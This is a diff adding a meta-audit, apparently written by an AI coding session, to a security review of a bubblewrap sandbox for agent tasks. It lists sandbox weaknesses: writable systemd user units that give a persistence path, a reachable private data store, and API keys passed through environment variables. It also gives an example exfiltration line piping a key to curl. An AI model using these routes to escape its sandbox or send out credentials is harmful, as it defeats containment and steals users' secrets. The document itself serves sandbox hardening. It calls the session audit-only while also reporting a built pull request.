@@ -193,3 +193,58 @@ Suggested order: **KP1, KP2 first** (security, small, high-value), then **KP3** 
 KP1, KP2, KP5, KP6 are verifiable (a test asserts the flag/bind), reversible (config + argv), and scoped — clean Tier-1 trial candidates. KP3 and KP4 carry a design decision (manifest shape; bind-vs-document) and want operator sign-off before build.
 
 *ΔΣ=42 — audit only; nothing in the codebase has been changed.*
+
+---
+
+## Meta-audit — auditing the audit (2026-06-12)
+
+- **Date:** 2026-06-12
+- **Auditor:** willow (Claude Code session, persona Hanuman) — audit-only, no code changed
+- **Trigger:** Operator — "audit the audit." Re-verify every checkable claim in this document (S1–S18), the plan-verification pass (V1–V3), and the unified remediation, against the *actual* code and file state on master — then look for what the auditor missed.
+- **Method:** read `core/kart_sandbox.py` + `kart-sandbox.json` line-by-line; grep/ls the V-series file-state claims via Kart (tasks B54AA056, F4C28356). Evidence, not the prose.
+
+### Session todo
+
+- [x] Read all three audit docs (Kart sandbox, plan-verification, unified remediation)
+- [x] Verify S-series structural claims against `kart_sandbox.py` + `kart-sandbox.json`
+- [x] Verify V-series file-state claims (startup.md, 2 placeholder skills, sweep schedule, audit_verify.py)
+- [x] Identify gaps the audit itself missed
+- [x] Append this meta-audit section to the doc
+- [x] Promote GAP A/B/C into Phase 0 — built in **PR #325** (KP1 + KP2 + GAP A/B/C, 18 tests pass; activation = `kart-worker` restart, host-side)
+
+### Verification result — every checkable claim held
+
+| Claim | Evidence | Verdict |
+|---|---|---|
+| S1 — `~/.ssh` + `~/.config/gh` rw-bound; `~/.netrc` ro on `allow_net` | config L48–49; argv L217–221 | ✅ true |
+| S2 — no `--new-session`, no `--seccomp` | `build_bwrap_argv` L170–233 | ✅ true |
+| S3 — `_add()` returns silently on missing path (empty == absent) | L114 `if not host.exists(): return` | ✅ true |
+| S6 — PATH never guarantees `~/.local/bin` | `kart_env` L263–341 | ✅ true |
+| S11 — `/tmp` rw-bound; code itself writes `/tmp/kart-nsswitch.conf` | config L53; argv L226 | ✅ true |
+| S12/S13/S14 — no ipc/uts unshare, no seccomp, pid-unshare w/o as-pid-1 | argv L170–233 | ✅ true |
+| V1 — 2 skills still `description: Willow Fylgja skill:` | both `SKILL.md` files | ✅ true |
+| V2 — `.claude/commands/startup.md` line 1 = `@markdownai v1.0` | `head -1` literal match | ✅ true |
+| V3 — `repo_fleet_sweep.py` exists, **zero** timer/service/cron refs | grep empty across repo | ✅ true |
+| VP3 — `scripts/audit_verify.py` does not exist (harness unbuilt) | `ls` ENOENT | ✅ true |
+| PR3 — `setup.sh` installs 0 `*.timer` units | grep empty | ✅ true |
+
+The `[verified]`/`[needs-read]` honesty tags in the unified remediation are accurate, and it caught its own `/tmp/kart-nsswitch.conf` dependency before proposing `--tmpfs /tmp`. **No finding was over-stated.** The "done ≠ closed" thesis is confirmed: S18, V1, V2, V3 are all real enacted residue.
+
+### Three gaps the auditor missed — all *deepen* S1/S4, none contradict
+
+**GAP A — the rw blast radius is wider than S1/S4 enumerate, and it includes the crown jewel.** *(security, the systemd item is plausibly High)*
+S1/S4 name `~/.ssh`, `~/.config/gh`, `~/github`, `~/.local`. The actual `bind_read_write` list *also* contains `~/agents`, `~/SAFE`, `~/safe-app-store`, `~/.config/git`, **`~/.config/systemd`**, `~/.kaggle`, `/media/willow`. Two matter:
+- **`~/.config/systemd` read-write** → an injected task can write/rewrite systemd *user units*. Persistence + escalation path. Unmentioned by the audit.
+- **The SAFE store is reachable read-write.** The thesis promise (atom `641e3ea3`) is "delete the SAFE folder and nothing can surface it." But `~/github/SAFE` exists and is rw through the `~/github` bind, and the config *intends* a direct `~/SAFE` bind (currently a no-op only because that literal path is absent on this host — `_add()` silently skips it, S9). The audit cited SSH keys as the sovereignty breach and walked past the actual sovereign data store.
+
+**GAP B — env-var credential passthrough is entirely uncovered.** *(security, same class as S1)*
+S1 is all about file binds. But `env_prefixes` in `kart-sandbox.json` passes live API keys into every task's environment: `ANTHROPIC_`, `OPENAI_`, `AWS_`, `GROQ_`, `HUGGINGFACE_`/`HF_`, `GITHUB_`, `DISCORD_`, `OPENROUTER_`, `TWINE_`/`PYPI_`. Same exfil class as S1 — an injected task with `allow_net` runs `echo $ANTHROPIC_API_KEY | curl`. **KP1 does not fix this** — KP1 only touches binds. The env surface needs the same explicit-opt-in gate as `~/.netrc`.
+
+**GAP C — the proposed KP1 fix is incomplete and would break SSH git.** *(correctness of the remedy)*
+S1's remedy is "drop `~/.ssh`, rely on `SSH_AUTH_SOCK`." But the agent *socket* lives under `XDG_RUNTIME_DIR` / `/run/user`, which is only `bind_try` (not guaranteed), and the socket *file* must be mounted for the agent to work inside bwrap. `SSH_AUTH` is in `env_prefixes` so the var passes, but the var without the bound socket is useless. Ship KP1 as written and SSH-based git fails. Phase 0/KP1 must add "bind `$SSH_AUTH_SOCK` into the sandbox" or it trades a leak for an outage.
+
+### Meta-verdict
+
+The auditor was honest and accurate — and, if anything, too gentle on itself. The security surface is wider than S1/S4 documented (systemd user units, the SAFE store, the credential env-vars), and one proposed fix (KP1) is under-specified in a way that would break a working path. None of this overturns the audit; it sharpens it. **When Phase 0 is built, KP1 must absorb GAP A (audit the full rw list, not the four named), GAP B (gate credential env-vars behind the same opt-in as `~/.netrc`), and GAP C (bind the SSH agent socket).**
+
+*ΔΣ=42 — meta-audit only; nothing in the codebase has been changed. The audit holds; these three gaps make the next one tighter.*
